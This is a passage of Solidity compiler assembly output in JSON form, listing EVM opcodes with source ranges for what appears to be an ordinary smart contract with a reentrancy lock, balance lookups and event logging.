										},
										{
											"begin": 443,
											"end": 450,
											"name": "PUSH",
											"value": "3E8"
										},
										{
											"begin": 5865,
											"end": 5896,
											"name": "PUSH [tag]",
											"value": "176"
										},
										{
											"begin": 5875,
											"end": 5895,
											"name": "PUSH [tag]",
											"value": "218"
										},
										{
											"begin": 5875,
											"end": 5882,
											"name": "DUP8"
										},
										{
											"begin": 5887,
											"end": 5894,
											"name": "DUP8"
										},
										{
											"begin": 5875,
											"end": 5895,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 5875,
											"end": 5886,
											"name": "PUSH [tag]",
											"value": "175"
										},
										{
											"begin": 5875,
											"end": 5895,
											"name": "AND"
										},
										{
											"begin": 5875,
											"end": 5895,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5875,
											"end": 5895,
											"name": "tag",
											"value": "218"
										},
										{
											"begin": 5875,
											"end": 5895,
											"name": "JUMPDEST"
										},
										{
											"begin": 5865,
											"end": 5874,
											"name": "PUSH [tag]",
											"value": "219"
										},
										{
											"begin": 5865,
											"end": 5896,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5865,
											"end": 5919,
											"name": "tag",
											"value": "216"
										},
										{
											"begin": 5865,
											"end": 5919,
											"name": "JUMPDEST"
										},
										{
											"begin": 5853,
											"end": 5919,
											"name": "SWAP9"
										},
										{
											"begin": 5853,
											"end": 5919,
											"name": "POP"
										},
										{
											"begin": 5933,
											"end": 5969,
											"name": "PUSH [tag]",
											"value": "220"
										},
										{
											"begin": 5947,
											"end": 5948,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 443,
											"end": 450,
											"name": "PUSH",
											"value": "3E8"
										},
										{
											"begin": 5933,
											"end": 5938,
											"name": "PUSH [tag]",
											"value": "221"
										},
										{
											"begin": 5933,
											"end": 5969,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5933,
											"end": 5969,
											"name": "tag",
											"value": "220"
										},
										{
											"begin": 5933,
											"end": 5969,
											"name": "JUMPDEST"
										},
										{
											"begin": 5816,
											"end": 6210,
											"name": "PUSH [tag]",
											"value": "222"
										},
										{
											"begin": 5816,
											"end": 6210,
											"name": "JUMP"
										},
										{
											"begin": 5816,
											"end": 6210,
											"name": "tag",
											"value": "215"
										},
										{
											"begin": 5816,
											"end": 6210,
											"name": "JUMPDEST"
										},
										{
											"begin": 6067,
											"end": 6199,
											"name": "PUSH [tag]",
											"value": "223"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 6093,
											"end": 6130,
											"name": "DUP10"
										},
										{
											"begin": 6093,
											"end": 6130,
											"name": "AND"
										},
										{
											"begin": 6093,
											"end": 6118,
											"name": "PUSH [tag]",
											"value": "224"
										},
										{
											"begin": 6093,
											"end": 6100,
											"name": "DUP7"
										},
										{
											"begin": 6105,
											"end": 6117,
											"name": "DUP5"
										},
										{
											"begin": 6093,
											"end": 6118,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 6093,
											"end": 6104,
											"name": "PUSH [tag]",
											"value": "175"
										},
										{
											"begin": 6093,
											"end": 6118,
											"name": "AND"
										},
										{
											"begin": 6093,
											"end": 6118,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 6093,
											"end": 6118,
											"name": "tag",
											"value": "224"
										},
										{
											"begin": 6093,
											"end": 6118,
											"name": "JUMPDEST"
										},
										{
											"begin": 6093,
											"end": 6130,
											"name": "DUP2"
										},
										{
											"begin": 6093,
											"end": 6130,
											"name": "PUSH [tag]",
											"value": "225"
										},
										{
											"begin": 6093,
											"end": 6130,
											"name": "JUMPI"
										},
										{
											"begin": 6093,
											"end": 6130,
											"name": "INVALID"
										},
										{
											"begin": 6093,
											"end": 6130,
											"name": "tag",
											"value": "225"
										},
										{
											"begin": 6093,
											"end": 6130,
											"name": "JUMPDEST"
										},
										{
											"begin": 6093,
											"end": 6130,
											"name": "DIV"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 6148,
											"end": 6185,
											"name": "DUP10"
										},
										{
											"begin": 6148,
											"end": 6185,
											"name": "AND"
										},
										{
											"begin": 6148,
											"end": 6173,
											"name": "PUSH [tag]",
											"value": "226"
										},
										{
											"begin": 6148,
											"end": 6155,
											"name": "DUP7"
										},
										{
											"begin": 6160,
											"end": 6172,
											"name": "DUP6"
										},
										{
											"begin": 6148,
											"end": 6173,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 6148,
											"end": 6159,
											"name": "PUSH [tag]",
											"value": "175"
										},
										{
											"begin": 6148,
											"end": 6173,
											"name": "AND"
										},
										{
											"begin": 6148,
											"end": 6173,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 6148,
											"end": 6173,
											"name": "tag",
											"value": "226"
										},
										{
											"begin": 6148,
											"end": 6173,
											"name": "JUMPDEST"
										},
										{
											"begin": 6148,
											"end": 6185,
											"name": "DUP2"
										},
										{
											"begin": 6148,
											"end": 6185,
											"name": "PUSH [tag]",
											"value": "227"
										},
										{
											"begin": 6148,
											"end": 6185,
											"name": "JUMPI"
										},
										{
											"begin": 6148,
											"end": 6185,
											"name": "INVALID"
										},
										{
											"begin": 6148,
											"end": 6185,
											"name": "tag",
											"value": "227"
										},
										{
											"begin": 6148,
											"end": 6185,
											"name": "JUMPDEST"
										},
										{
											"begin": 6148,
											"end": 6185,
											"name": "DIV"
										},
										{
											"begin": 6067,
											"end": 6075,
											"name": "PUSH [tag]",
											"value": "228"
										},
										{
											"begin": 6067,
											"end": 6199,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 6067,
											"end": 6199,
											"name": "tag",
											"value": "223"
										},
										{
											"begin": 6067,
											"end": 6199,
											"name": "JUMPDEST"
										},
										{
											"begin": 6055,
											"end": 6199,
											"name": "SWAP9"
										},
										{
											"begin": 6055,
											"end": 6199,
											"name": "POP"
										},
										{
											"begin": 5816,
											"end": 6210,
											"name": "tag",
											"value": "222"
										},
										{
											"begin": 5816,
											"end": 6210,
											"name": "JUMPDEST"
										},
										{
											"begin": 6239,
											"end": 6240,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 6227,
											"end": 6236,
											"name": "DUP10"
										},
										{
											"begin": 6227,
											"end": 6240,
											"name": "GT"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "PUSH [tag]",
											"value": "229"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "JUMPI"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "DUP2"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "MSTORE"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "ADD"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "DUP1"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "DUP1"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "ADD"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "DUP3"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "DUP2"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "SUB"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "DUP3"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "MSTORE"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "PUSH",
											"value": "26"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "DUP2"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "MSTORE"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "ADD"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "DUP1"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "PUSH data",
											"value": "EF633320352A650C1D75752F13E6C73D8D8F7F26A5596A6D026C1BF50D2F7713"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "PUSH",
											"value": "26"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "SWAP2"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "CODECOPY"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "ADD"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "SWAP2"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "POP"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "POP"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "MLOAD"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "DUP1"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "SWAP2"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "SUB"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "SWAP1"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "REVERT"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "tag",
											"value": "229"
										},
										{
											"begin": 6219,
											"end": 6283,
											"name": "JUMPDEST"
										},
										{
											"begin": 6293,
											"end": 6313,
											"name": "PUSH [tag]",
											"value": "230"
										},
										{
											"begin": 6299,
											"end": 6301,
											"name": "DUP11"
										},
										{
											"begin": 6303,
											"end": 6312,
											"name": "DUP11"
										},
										{
											"begin": 6293,
											"end": 6298,
											"name": "PUSH [tag]",
											"value": "221"
										},
										{
											"begin": 6293,
											"end": 6313,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 6293,
											"end": 6313,
											"name": "tag",
											"value": "230"
										},
										{
											"begin": 6293,
											"end": 6313,
											"name": "JUMPDEST"
										},
										{
											"begin": 6324,
											"end": 6373,
											"name": "PUSH [tag]",
											"value": "231"
										},
										{
											"begin": 6332,
											"end": 6340,
											"name": "DUP7"
										},
										{
											"begin": 6342,
											"end": 6350,
											"name": "DUP7"
										},
										{
											"begin": 6352,
											"end": 6361,
											"name": "DUP11"
										},
										{
											"begin": 6363,
											"end": 6372,
											"name": "DUP11"
										},
										{
											"begin": 6324,
											"end": 6331,
											"name": "PUSH [tag]",
											"value": "186"
										},
										{
											"begin": 6324,
											"end": 6373,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 6324,
											"end": 6373,
											"name": "tag",
											"value": "231"
										},
										{
											"begin": 6324,
											"end": 6373,
											"name": "JUMPDEST"
										},
										{
											"begin": 6387,
											"end": 6392,
											"name": "DUP2"
										},
										{
											"begin": 6383,
											"end": 6430,
											"name": "ISZERO"
										},
										{
											"begin": 6383,
											"end": 6430,
											"name": "PUSH [tag]",
											"value": "232"
										},
										{
											"begin": 6383,
											"end": 6430,
											"name": "JUMPI"
										},
										{
											"begin": 6421,
											"end": 6429,
											"name": "PUSH",
											"value": "B"
										},
										{
											"begin": 6421,
											"end": 6429,
											"name": "SLOAD"
										},
										{
											"begin": 6402,
											"end": 6430,
											"name": "PUSH [tag]",
											"value": "233"
										},
										{
											"begin": 6402,
											"end": 6430,
											"name": "SWAP1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 6407,
											"end": 6415,
											"name": "DUP1"
										},
										{
											"begin": 6407,
											"end": 6415,
											"name": "DUP3"
										},
										{
											"begin": 6407,
											"end": 6415,
											"name": "AND"
										},
										{
											"begin": 6407,
											"end": 6415,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 6421,
											"end": 6429,
											"name": "SWAP1"
										},
										{
											"begin": 6421,
											"end": 6429,
											"name": "DIV"
										},
										{
											"begin": 6421,
											"end": 6429,
											"name": "AND"
										},
										{
											"begin": 6402,
											"end": 6430,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 6402,
											"end": 6420,
											"name": "PUSH [tag]",
											"value": "175"
										},
										{
											"begin": 6402,
											"end": 6430,
											"name": "AND"
										},
										{
											"begin": 6402,
											"end": 6430,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 6402,
											"end": 6430,
											"name": "tag",
											"value": "233"
										},
										{
											"begin": 6402,
											"end": 6430,
											"name": "JUMPDEST"
										},
										{
											"begin": 6394,
											"end": 6399,
											"name": "PUSH",
											"value": "E"
										},
										{
											"begin": 6394,
											"end": 6430,
											"name": "SSTORE"
										},
										{
											"begin": 6383,
											"end": 6430,
											"name": "tag",
											"value": "232"
										},
										{
											"begin": 6383,
											"end": 6430,
											"name": "JUMPDEST"
										},
										{
											"begin": 6485,
											"end": 6519,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 6485,
											"end": 6519,
											"name": "DUP1"
										},
										{
											"begin": 6485,
											"end": 6519,
											"name": "MLOAD"
										},
										{
											"begin": 6485,
											"end": 6519,
											"name": "DUP6"
										},
										{
											"begin": 6485,
											"end": 6519,
											"name": "DUP2"
										},
										{
											"begin": 6485,
											"end": 6519,
											"name": "MSTORE"
										},
										{
											"begin": 6485,
											"end": 6519,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 6485,
											"end": 6519,
											"name": "DUP2"
										},
										{
											"begin": 6485,
											"end": 6519,
											"name": "ADD"
										},
										{
											"begin": 6485,
											"end": 6519,
											"name": "DUP6"
										},
										{
											"begin": 6485,
											"end": 6519,
											"name": "SWAP1"
										},
										{
											"begin": 6485,
											"end": 6519,
											"name": "MSTORE"
										},
										{
											"begin": 6485,
											"end": 6519,
											"name": "DUP2"
										},
										{
											"begin": 6485,
											"end": 6519,
											"name": "MLOAD"
										},
										{
											"begin": 6490,
											"end": 6500,
											"name": "CALLER"
										},
										{
											"begin": 6490,
											"end": 6500,
											"name": "SWAP3"
										},
										{
											"begin": 6485,
											"end": 6519,
											"name": "PUSH",
											"value": "4C209B5FC8AD50758F13E2E1088BA56A560DFF690A1C6FEF26394F4C03821C4F"
										},
										{
											"begin": 6485,
											"end": 6519,
											"name": "SWAP3"
										},
										{
											"begin": 6485,
											"end": 6519,
											"name": "DUP3"
										},
										{
											"begin": 6485,
											"end": 6519,
											"name": "SWAP1"
										},
										{
											"begin": 6485,
											"end": 6519,
											"name": "SUB"
										},
										{
											"begin": 6485,
											"end": 6519,
											"name": "ADD"
										},
										{
											"begin": 6485,
											"end": 6519,
											"name": "SWAP1"
										},
										{
											"begin": 6485,
											"end": 6519,
											"name": "LOG2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 1292,
											"end": 1293,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1281,
											"end": 1289,
											"name": "PUSH",
											"value": "10"
										},
										{
											"begin": 1281,
											"end": 1293,
											"name": "SSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5261,
											"end": 6526,
											"name": "SWAP5"
										},
										{
											"begin": 5261,
											"end": 6526,
											"name": "SWAP7"
										},
										{
											"begin": 5261,
											"end": 6526,
											"name": "SWAP6"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5261,
											"end": 6526,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "tag",
											"value": "91"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "JUMPDEST"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "MSTORE"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "SWAP1"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "DUP2"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "MSTORE"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "SWAP1"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "KECCAK256"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "SLOAD"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "DUP2"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1010,
											"end": 1027,
											"name": "tag",
											"value": "93"
										},
										{
											"begin": 1010,
											"end": 1027,
											"name": "JUMPDEST"
										},
										{
											"begin": 1010,
											"end": 1027,
											"name": "PUSH",
											"value": "E"
										},
										{
											"begin": 1010,
											"end": 1027,
											"name": "SLOAD"
										},
										{
											"begin": 1010,
											"end": 1027,
											"name": "DUP2"
										},
										{
											"begin": 1010,
											"end": 1027,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "tag",
											"value": "96"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "JUMPDEST"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "PUSH",
											"value": "5"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "MSTORE"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "SWAP1"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "DUP2"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "MSTORE"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "SWAP1"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "KECCAK256"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "SLOAD"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "DUP2"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "tag",
											"value": "99"
										},
										{
											"begin": 8025,
											"end": 9454,
											"name": "JUMPDEST"
										},
										{
											"begin": 8088,
											"end": 8100,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 8102,
											"end": 8114,
											"name": "DUP1"
										},
										{
											"begin": 1205,
											"end": 1213,
											"name": "PUSH",
											"value": "10"
										},
										{
											"begin": 1205,
											"end": 1213,
											"name": "SLOAD"
										},
										{
											"begin": 1217,
											"end": 1218,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1205,
											"end": 1218,
											"name": "EQ"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH [tag]",
											"value": "235"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "JUMPI"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP2"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MSTORE"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP3"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "ADD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MSTORE"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP3"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "ADD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "14185B98D85AD94E881313D0D2D151"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "8A"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP3"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "ADD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MSTORE"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SWAP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "MLOAD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SWAP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "DUP2"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SWAP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SUB"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "ADD"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "SWAP1"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "REVERT"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "tag",
											"value": "235"
										},
										{
											"begin": 1197,
											"end": 1238,
											"name": "JUMPDEST"
										},
										{
											"begin": 1259,
											"end": 1260,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1248,
											"end": 1256,
											"name": "PUSH",
											"value": "10"
										},
										{
											"begin": 1248,
											"end": 1260,
											"name": "DUP2"
										},
										{
											"begin": 1248,
											"end": 1260,
											"name": "SWAP1"
										},
										{
											"begin": 1248,
											"end": 1260,
											"name": "SSTORE"
										},
										{
											"begin": 1259,
											"end": 1260,
											"name": "DUP1"
										},
										{
											"begin": 8169,
											"end": 8182,
											"name": "PUSH [tag]",
											"value": "237"
										},
										{
											"begin": 8169,
											"end": 8180,
											"name": "PUSH [tag]",
											"value": "56"
										},
										{
											"begin": 8169,
											"end": 8182,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 8169,
											"end": 8182,
											"name": "tag",
											"value": "237"
										},
										{
											"begin": 8169,
											"end": 8182,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 8225,
											"end": 8231,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 8225,
											"end": 8231,
											"name": "SLOAD"
										},
										{
											"begin": 8274,
											"end": 8280,
											"name": "PUSH",
											"value": "9"
										},
										{
											"begin": 8274,
											"end": 8280,
											"name": "SLOAD"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "DUP1"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "DUP2"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "MSTORE"
										},
										{
											"begin": 8355,
											"end": 8359,
											"name": "ADDRESS"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "DUP3"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "ADD"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "MSTORE"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "SWAP1"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "MLOAD"
										},
										{
											"begin": 8126,
											"end": 8182,
											"name": "SWAP5"
										},
										{
											"begin": 8126,
											"end": 8182,
											"name": "SWAP7"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 8126,
											"end": 8182,
											"name": "SWAP3"
										},
										{
											"begin": 8126,
											"end": 8182,
											"name": "SWAP5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 8225,
											"end": 8231,
											"name": "SWAP2"
										},
										{
											"begin": 8225,
											"end": 8231,
											"name": "DUP3"
										},
										{
											"begin": 8225,
											"end": 8231,
											"name": "AND"
										},
										{
											"begin": 8225,
											"end": 8231,
											"name": "SWAP4"
										},
										{
											"begin": 8274,
											"end": 8280,
											"name": "SWAP2"
										},
										{
											"begin": 8274,
											"end": 8280,
											"name": "AND"
										},
										{
											"begin": 8274,
											"end": 8280,
											"name": "SWAP2"
										},
										{
											"begin": 8207,
											"end": 8222,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 8207,
											"end": 8222,
											"name": "SWAP2"
										},
										{
											"begin": 8225,
											"end": 8231,
											"name": "DUP5"
										},
										{
											"begin": 8225,
											"end": 8231,
											"name": "SWAP2"
										},
										{
											"begin": 8321,
											"end": 8346,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 8321,
											"end": 8346,
											"name": "SWAP2"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "DUP1"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "DUP4"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "ADD"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "SWAP3"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "SWAP3"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "SWAP2"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "SWAP1"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "DUP3"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "SWAP1"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "SUB"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "ADD"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "DUP2"
										},
										{
											"begin": 8225,
											"end": 8231,
											"name": "DUP7"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "DUP1"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 8321,
											"end": 8361,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "238"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
